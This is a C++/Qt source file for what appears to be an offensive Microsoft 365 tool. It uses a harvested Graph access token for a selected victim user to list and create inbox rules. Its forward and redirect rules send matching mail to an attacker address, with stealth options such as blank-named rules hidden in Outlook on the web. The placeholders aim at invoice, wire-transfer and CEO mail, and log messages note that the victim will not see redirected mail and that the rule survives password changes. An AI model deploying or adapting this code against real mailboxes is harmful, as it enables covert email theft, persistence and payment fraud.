#include "EmailRulesWindow.h"
#include "UserSelectorWidget.h"
#include "TokenHelper.h"
#include "WindowHelper.h"
#include "NetworkHelper.h"

#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QFormLayout>
#include <QSplitter>
#include <QHeaderView>
#include <QJsonDocument>
#include <QJsonObject>
#include <QMessageBox>
#include <QApplication>
#include <QClipboard>

EmailRulesWindow::EmailRulesWindow(QWidget *parent)
    : QWidget(parent), net(new QNetworkAccessManager(this))
{
    setWindowTitle("Email Rules - Persistence");
    setAttribute(Qt::WA_DeleteOnClose);
    setupUi();
}

EmailRulesWindow::~EmailRulesWindow() {
    // Disconnect ALL network replies to prevent callbacks during destruction
    if (net) {
        const auto replies = net->findChildren<QNetworkReply*>();
        for (auto *r : replies) {
            r->disconnect();
            r->abort();
        }
    }
    activeReplies.clear();
}

void EmailRulesWindow::setupUi() {
    auto *mainLayout = new QVBoxLayout(this);

    // Token section
    auto *tokenGroup = new QGroupBox("Microsoft Graph Token", this);
    auto *tokenLayout = new QVBoxLayout(tokenGroup);

    userSelector = new UserSelectorWidget(this);
    tokenLayout->addWidget(userSelector);
    connect(userSelector, &UserSelectorWidget::userChanged, this, &EmailRulesWindow::onUserChanged);
    connect(userSelector, &UserSelectorWidget::logMessage, this, &EmailRulesWindow::appendLog);

    auto *autoFetchRow = new QHBoxLayout();
    autoFetchBtn = new QPushButton("Auto-Fetch Token for Selected User", this);
    autoFetchBtn->setStyleSheet("QPushButton { background-color: #2d5aa0; color: white; font-weight: bold; padding: 6px 12px; }");
    autoFetchRow->addWidget(autoFetchBtn);
    autoFetchRow->addStretch();
    tokenLayout->addLayout(autoFetchRow);
    connect(autoFetchBtn, &QPushButton::clicked, this, &EmailRulesWindow::autoFetchTokens);

    auto *tokenRow = new QHBoxLayout();
    tokenInput = new QLineEdit(this);
    tokenInput->setPlaceholderText("Paste access token for https://graph.microsoft.com");
    tokenInput->setEchoMode(QLineEdit::Password);
    tokenRow->addWidget(tokenInput);
    tokenStatus = new QLabel(this);
    tokenStatus->setFixedWidth(80);
    tokenRow->addWidget(tokenStatus);
    tokenLayout->addLayout(tokenRow);

    auto *permNote = new QLabel("<i>Required: <b>MailboxSettings.ReadWrite</b> (not Mail.ReadWrite!)</i>", this);
    permNote->setStyleSheet("color: #ffc107; font-size: 10px;");
    tokenLayout->addWidget(permNote);

    mainLayout->addWidget(tokenGroup);

    // Splitter for rules list and create section
    auto *splitter = new QSplitter(Qt::Horizontal, this);

    // Left side - existing rules
    auto *rulesWidget = new QWidget(this);
    auto *rulesLayout = new QVBoxLayout(rulesWidget);

    auto *rulesHeader = new QHBoxLayout();
    listRulesBtn = new QPushButton("List Existing Rules", this);
    listRulesBtn->setStyleSheet("QPushButton { background-color: #28a745; color: white; font-weight: bold; }");
    deleteRuleBtn = new QPushButton("Delete Selected", this);
    deleteRuleBtn->setStyleSheet("QPushButton { background-color: #dc3545; color: white; }");
    deleteRuleBtn->setEnabled(false);
    cancelBtn = new QPushButton("Cancel", this);
    cancelBtn->setStyleSheet("QPushButton { background-color: #dc3545; color: white; font-weight: bold; }");
    cancelBtn->setEnabled(false);
    rulesHeader->addWidget(listRulesBtn);
    rulesHeader->addWidget(deleteRuleBtn);
    rulesHeader->addWidget(cancelBtn);
    rulesHeader->addStretch();
    rulesLayout->addLayout(rulesHeader);

    rulesTable = new QTableWidget(this);
    rulesTable->setColumnCount(5);
    rulesTable->setHorizontalHeaderLabels({"Name", "Enabled", "Action", "Conditions", "ID"});
    rulesTable->horizontalHeader()->setSectionResizeMode(QHeaderView::ResizeToContents);
    rulesTable->horizontalHeader()->setStretchLastSection(true);
    rulesTable->setSelectionBehavior(QAbstractItemView::SelectRows);
    rulesTable->setSelectionMode(QAbstractItemView::SingleSelection);
    rulesTable->setAlternatingRowColors(true);
    rulesLayout->addWidget(rulesTable);

    connect(listRulesBtn, &QPushButton::clicked, this, &EmailRulesWindow::listRules);
    connect(deleteRuleBtn, &QPushButton::clicked, this, &EmailRulesWindow::deleteRule);
    connect(rulesTable, &QTableWidget::itemSelectionChanged, this, &EmailRulesWindow::onRuleSelected);
    connect(cancelBtn, &QPushButton::clicked, this, &EmailRulesWindow::cancelRequests);

    splitter->addWidget(rulesWidget);

    // Right side - create rule
    createRuleGroup = new QGroupBox("Create Forwarding Rule", this);
    auto *createLayout = new QVBoxLayout(createRuleGroup);

    auto *formLayout = new QFormLayout();

    ruleNameInput = new QLineEdit(this);
    ruleNameInput->setPlaceholderText("Rule display name");
    formLayout->addRow("Rule Name:", ruleNameInput);

    actionTypeCombo = new QComboBox(this);
    actionTypeCombo->addItem("Forward To (copy)", "forwardTo");
    actionTypeCombo->addItem("Redirect To (move entirely)", "redirectTo");
    actionTypeCombo->addItem("Move To Deleted Items", "moveToFolder");
    formLayout->addRow("Action:", actionTypeCombo);

    targetEmailInput = new QLineEdit(this);
    targetEmailInput->setPlaceholderText("attacker@evil.com");
    formLayout->addRow("Target Email:", targetEmailInput);

    createLayout->addLayout(formLayout);

    // Conditions group
    auto *conditionsGroup = new QGroupBox("Conditions (leave empty for all emails)", this);
    auto *condLayout = new QFormLayout(conditionsGroup);

    subjectContainsInput = new QLineEdit(this);
    subjectContainsInput->setPlaceholderText("invoice, payment, wire, transfer");
    condLayout->addRow("Subject Contains:", subjectContainsInput);

    fromContainsInput = new QLineEdit(this);
    fromContainsInput->setPlaceholderText("ceo@company.com, finance@");
    condLayout->addRow("From Contains:", fromContainsInput);

    bodyContainsInput = new QLineEdit(this);
    bodyContainsInput->setPlaceholderText("bank account, routing number");
    condLayout->addRow("Body Contains:", bodyContainsInput);

    matchAllConditions = new QCheckBox("Match ALL conditions (AND)", this);
    condLayout->addRow("", matchAllConditions);

    createLayout->addWidget(conditionsGroup);

    // Stealth options
    auto *stealthGroup = new QGroupBox("Stealth Options", this);
    auto *stealthLayout = new QVBoxLayout(stealthGroup);

    hiddenRuleCheck = new QCheckBox("Hidden rule (blank display name)", this);
    hiddenRuleCheck->setToolTip("Use a single space as name - harder to spot in OWA");
    stealthLayout->addWidget(hiddenRuleCheck);

    auto *seqLayout = new QHBoxLayout();
    seqLayout->addWidget(new QLabel("Sequence (priority):"));
    sequenceInput = new QLineEdit(this);
    sequenceInput->setText("1");
    sequenceInput->setFixedWidth(60);
    sequenceInput->setToolTip("Lower = processed first. Use high number to process last.");
    seqLayout->addWidget(sequenceInput);
    seqLayout->addStretch();
    stealthLayout->addLayout(seqLayout);

    stopProcessingCheck = new QCheckBox("Stop processing more rules after match", this);
    stopProcessingCheck->setToolTip("Prevents other rules from acting on the email");
    stealthLayout->addWidget(stopProcessingCheck);

    createLayout->addWidget(stealthGroup);

    createRuleBtn = new QPushButton("Create Rule", this);
    createRuleBtn->setStyleSheet("QPushButton { background-color: #fd7e14; color: white; font-weight: bold; padding: 10px; }");
    createLayout->addWidget(createRuleBtn);
    connect(createRuleBtn, &QPushButton::clicked, this, &EmailRulesWindow::createRule);

    createLayout->addStretch();

    splitter->addWidget(createRuleGroup);
    splitter->setSizes({400, 500});

    mainLayout->addWidget(splitter);

    // Log output
    logOutput = new QTextEdit(this);
    logOutput->setReadOnly(true);
    logOutput->setMaximumHeight(150);
    mainLayout->addWidget(logOutput);

    // Progress bar
    progressBar = new QProgressBar(this);
    progressBar->setVisible(false);
    progressBar->setRange(0, 0);
    mainLayout->addWidget(progressBar);

    resize(1000, 700);
}

QNetworkRequest EmailRulesWindow::graphRequest(const QString &url, const QString &token) {
    return NetworkHelper::createBearerRequest(url, token);
}

void EmailRulesWindow::appendLog(const QString &msg, const QString &color) {
    logOutput->append(QString("<span style='color:%1'>%2</span>").arg(color, msg));
}

void EmailRulesWindow::setLoading(bool loading) {
    progressBar->setVisible(loading);
    listRulesBtn->setEnabled(!loading);
    createRuleBtn->setEnabled(!loading);
    deleteRuleBtn->setEnabled(!loading && !selectedRuleId.isEmpty());
    tokenInput->setEnabled(!loading);
    autoFetchBtn->setEnabled(!loading);
    cancelBtn->setEnabled(loading);
    if (!loading) {
        cancelRequested = false;
    }
}

void EmailRulesWindow::updateTokenStatus() {
    QString token = tokenInput->text().trimmed();
    if (token.isEmpty()) {
        tokenStatus->setText("No Token");
        tokenStatus->setStyleSheet("color: gray;");
    } else {
        tokenStatus->setText("Ready");
        tokenStatus->setStyleSheet("color: #00ff00;");
    }
}

void EmailRulesWindow::onUserChanged(const QString &upn) {
    tokenInput->clear();
    updateTokenStatus();
    appendLog(QString("[*] Switched to user: %1").arg(upn), "cyan");
}

void EmailRulesWindow::autoFetchTokens() {
    if (!userSelector->hasSelection()) {
        appendLog("[-] Please select a user first", "red");
        return;
    }

    appendLog("[*] Fetching Graph token for selected user...", "cyan");
    userSelector->fetchToken("https://graph.microsoft.com", [this](bool success, const QString &token, const QString &error) {
        if (success) {
            tokenInput->setText(token);
            updateTokenStatus();
            appendLog("[+] Graph token acquired", "green");
        } else {
            appendLog(QString("[-] Failed to fetch token: %1").arg(error), "red");
        }
    });
}

void EmailRulesWindow::listRules() {
    currentToken = tokenInput->text().trimmed();
    if (currentToken.isEmpty()) {
        QMessageBox::warning(this, "Missing Token", "Please enter a Microsoft Graph access token.");
        return;
    }

    setLoading(true);
    appendLog("[*] Fetching inbox rules...", "cyan");
    rulesTable->setRowCount(0);
    existingRules = QJsonArray();

    QString url = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules";
    QNetworkReply *reply = net->get(graphRequest(url, currentToken));

    if (!reply) {
        appendLog("[-] Failed to create network request", "red");
        setLoading(false);
        return;
    }

    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        reply->deleteLater();
        setLoading(false);

        QString errorMsg;
        if (!NetworkHelper::isReplySuccess(reply, &errorMsg)) {
            appendLog(QString("[-] Error: %1").arg(errorMsg), "red");

            int status = NetworkHelper::getHttpStatus(reply);
            if (status == 403) {
                appendLog("[!] Access denied. Token requires MailboxSettings.ReadWrite permission.", "yellow");
                appendLog("[!] Note: Mail.ReadWrite is NOT sufficient for inbox rules.", "yellow");
                appendLog("[!] Try using client ID: Azure PowerShell (1950a258-227b-4e31-a9cf-717495945fc2)", "cyan");
            }
            return;
        }

        QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
        QJsonArray rules = doc.object().value("value").toArray();
        existingRules = rules;

        if (rules.isEmpty()) {
            appendLog("[*] No inbox rules found.", "cyan");
            return;
        }

        appendLog(QString("[+] Found %1 inbox rule(s)").arg(rules.size()), "green");

        for (const QJsonValue &val : rules) {
            QJsonObject rule = val.toObject();

            int row = rulesTable->rowCount();
            rulesTable->insertRow(row);

            QString name = rule.value("displayName").toString();
            bool enabled = rule.value("isEnabled").toBool();
            QString ruleId = rule.value("id").toString();

            // Determine action type
            QString action = "Unknown";
            QJsonObject actions = rule.value("actions").toObject();
            if (!actions.value("forwardTo").toArray().isEmpty()) {
                QJsonArray fwd = actions.value("forwardTo").toArray();
                QString target = fwd.first().toObject().value("emailAddress").toObject().value("address").toString();
                action = QString("Forward → %1").arg(target);
            } else if (!actions.value("redirectTo").toArray().isEmpty()) {
                QJsonArray redir = actions.value("redirectTo").toArray();
                QString target = redir.first().toObject().value("emailAddress").toObject().value("address").toString();
                action = QString("Redirect → %1").arg(target);
            } else if (!actions.value("moveToFolder").toString().isEmpty()) {
                action = "Move to folder";
            } else if (actions.value("delete").toBool()) {
                action = "Delete";
            }

            // Summarize conditions
            QStringList condList;
            QJsonObject conditions = rule.value("conditions").toObject();
            if (!conditions.value("subjectContains").toArray().isEmpty()) {
                condList << "Subject match";
            }
            if (!conditions.value("fromAddresses").toArray().isEmpty()) {
                condList << "From match";
            }
            if (!conditions.value("bodyContains").toArray().isEmpty()) {
                condList << "Body match";
            }
            QString condStr = condList.isEmpty() ? "All emails" : condList.join(", ");

            rulesTable->setItem(row, 0, new QTableWidgetItem(name.isEmpty() ? "(hidden)" : name));
            rulesTable->setItem(row, 1, new QTableWidgetItem(enabled ? "Yes" : "No"));
            rulesTable->setItem(row, 2, new QTableWidgetItem(action));
            rulesTable->setItem(row, 3, new QTableWidgetItem(condStr));
            rulesTable->setItem(row, 4, new QTableWidgetItem(ruleId));

            // Highlight forwarding/redirect rules
            if (action.startsWith("Forward") || action.startsWith("Redirect")) {
                for (int c = 0; c < rulesTable->columnCount(); c++) {
                    rulesTable->item(row, c)->setBackground(QBrush(QColor(80, 40, 0)));
                    rulesTable->item(row, c)->setForeground(QBrush(QColor("#ff9800")));
                }
            }
        }
    });
}

void EmailRulesWindow::onRuleSelected() {
    auto selected = rulesTable->selectedItems();
    if (selected.isEmpty()) {
        selectedRuleId.clear();
        deleteRuleBtn->setEnabled(false);
        return;
    }

    int row = selected.first()->row();
    selectedRuleId = rulesTable->item(row, 4)->text();
    deleteRuleBtn->setEnabled(true);
}

void EmailRulesWindow::deleteRule() {
    if (selectedRuleId.isEmpty()) {
        QMessageBox::warning(this, "No Selection", "Please select a rule to delete.");
        return;
    }

    currentToken = tokenInput->text().trimmed();
    if (currentToken.isEmpty()) {
        QMessageBox::warning(this, "Missing Token", "Please enter a token.");
        return;
    }

    int confirm = QMessageBox::question(this, "Confirm Delete",
        QString("Delete rule ID: %1?").arg(selectedRuleId.left(20) + "..."),
        QMessageBox::Yes | QMessageBox::No);

    if (confirm != QMessageBox::Yes) return;

    setLoading(true);
    appendLog(QString("[*] Deleting rule %1...").arg(selectedRuleId.left(20)), "cyan");

    QString url = QString("https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules/%1").arg(selectedRuleId);
    QNetworkReply *reply = net->deleteResource(graphRequest(url, currentToken));

    if (!reply) {
        appendLog("[-] Failed to create network request", "red");
        setLoading(false);
        return;
    }

    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        reply->deleteLater();
        setLoading(false);

        QString errorMsg;
        if (!NetworkHelper::isReplySuccess(reply, &errorMsg)) {
            appendLog(QString("[-] Delete failed: %1").arg(errorMsg), "red");
            return;
        }

        appendLog("[+] Rule deleted successfully!", "green");
        selectedRuleId.clear();
        listRules(); // Refresh
    });
}

QString EmailRulesWindow::buildRuleJson() {
    QJsonObject rule;

    // Display name
    QString name = ruleNameInput->text().trimmed();
    if (hiddenRuleCheck->isChecked() || name.isEmpty()) {
        name = " "; // Single space - hidden in OWA
    }
    rule["displayName"] = name;

    // Sequence
    int seq = sequenceInput->text().toInt();
    if (seq < 1) seq = 1;
    rule["sequence"] = seq;

    rule["isEnabled"] = true;

    // Conditions
    QJsonObject conditions;
    bool hasConditions = false;

    QString subjectKeywords = subjectContainsInput->text().trimmed();
    if (!subjectKeywords.isEmpty()) {
        QJsonArray subjects;
        for (const QString &kw : subjectKeywords.split(",")) {
            if (!kw.trimmed().isEmpty()) {
                subjects.append(kw.trimmed());
            }
        }
        if (!subjects.isEmpty()) {
            conditions["subjectContains"] = subjects;
            hasConditions = true;
        }
    }

    QString fromAddresses = fromContainsInput->text().trimmed();
    if (!fromAddresses.isEmpty()) {
        QJsonArray fromArr;
        for (const QString &addr : fromAddresses.split(",")) {
            if (!addr.trimmed().isEmpty()) {
                QJsonObject emailAddr;
                emailAddr["emailAddress"] = QJsonObject{{"address", addr.trimmed()}};
                fromArr.append(emailAddr);
            }
        }
        if (!fromArr.isEmpty()) {
            conditions["fromAddresses"] = fromArr;
            hasConditions = true;
        }
    }

    QString bodyKeywords = bodyContainsInput->text().trimmed();
    if (!bodyKeywords.isEmpty()) {
        QJsonArray bodies;
        for (const QString &kw : bodyKeywords.split(",")) {
            if (!kw.trimmed().isEmpty()) {
                bodies.append(kw.trimmed());
            }
        }
        if (!bodies.isEmpty()) {
            conditions["bodyContains"] = bodies;
            hasConditions = true;
        }
    }

    if (hasConditions) {
        rule["conditions"] = conditions;
    }

    // Actions
    QJsonObject actions;
    QString actionType = actionTypeCombo->currentData().toString();
    QString targetEmail = targetEmailInput->text().trimmed();

    if (actionType == "forwardTo" && !targetEmail.isEmpty()) {
        QJsonArray forwardTo;
        QJsonObject recipient;
        recipient["emailAddress"] = QJsonObject{{"address", targetEmail}};
        forwardTo.append(recipient);
        actions["forwardTo"] = forwardTo;
    } else if (actionType == "redirectTo" && !targetEmail.isEmpty()) {
        QJsonArray redirectTo;
        QJsonObject recipient;
        recipient["emailAddress"] = QJsonObject{{"address", targetEmail}};
        redirectTo.append(recipient);
        actions["redirectTo"] = redirectTo;
    } else if (actionType == "moveToFolder") {
        // Move to Deleted Items
        actions["moveToFolder"] = "deleteditems";
    }

    if (stopProcessingCheck->isChecked()) {
        actions["stopProcessingRules"] = true;
    }

    rule["actions"] = actions;

    return QString::fromUtf8(QJsonDocument(rule).toJson(QJsonDocument::Compact));
}

void EmailRulesWindow::createRule() {
    currentToken = tokenInput->text().trimmed();
    if (currentToken.isEmpty()) {
        QMessageBox::warning(this, "Missing Token", "Please enter a Microsoft Graph access token.");
        return;
    }

    QString targetEmail = targetEmailInput->text().trimmed();
    QString actionType = actionTypeCombo->currentData().toString();

    if ((actionType == "forwardTo" || actionType == "redirectTo") && targetEmail.isEmpty()) {
        QMessageBox::warning(this, "Missing Target", "Please enter a target email address.");
        return;
    }

    setLoading(true);
    appendLog("[*] Creating inbox rule...", "cyan");

    QString ruleJson = buildRuleJson();
    appendLog(QString("[*] Rule JSON: %1").arg(ruleJson.left(200) + "..."), "gray");

    QString url = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules";
    QNetworkRequest req = graphRequest(url, currentToken);

    QNetworkReply *reply = net->post(req, ruleJson.toUtf8());

    if (!reply) {
        appendLog("[-] Failed to create network request", "red");
        setLoading(false);
        return;
    }

    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        reply->deleteLater();
        setLoading(false);

        QString errorMsg;
        if (!NetworkHelper::isReplySuccess(reply, &errorMsg)) {
            appendLog(QString("[-] Error: %1").arg(errorMsg), "red");

            int status = NetworkHelper::getHttpStatus(reply);
            if (status == 403) {
                appendLog("[!] Access denied. Need Mail.ReadWrite or MailboxSettings.ReadWrite permission.", "yellow");
            }
            return;
        }

        QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
        QString ruleId = doc.object().value("id").toString();

        appendLog("[+] Rule created successfully!", "green");
        appendLog(QString("[+] Rule ID: %1").arg(ruleId), "green");

        QString actionType = actionTypeCombo->currentData().toString();
        QString target = targetEmailInput->text().trimmed();

        if (actionType == "forwardTo") {
            appendLog(QString("[+] All matching emails will be FORWARDED to: %1").arg(target), "yellow");
            appendLog("[*] Original emails remain in victim's inbox.", "cyan");
        } else if (actionType == "redirectTo") {
            appendLog(QString("[+] All matching emails will be REDIRECTED to: %1").arg(target), "yellow");
            appendLog("[!] Victim will NOT see these emails!", "red");
        }

        appendLog("[*] Rule persists even after password change.", "cyan");

        // Refresh list
        listRules();
    });
}

void EmailRulesWindow::cancelRequests() {
    cancelRequested = true;
    appendLog("[!] Cancelling requests...", "yellow");
    for (QNetworkReply *reply : activeReplies) {
        if (reply && !reply->isFinished()) {
            reply->abort();
        }
    }
    activeReplies.clear();
    setLoading(false);
    appendLog("[*] Requests cancelled", "yellow");
}
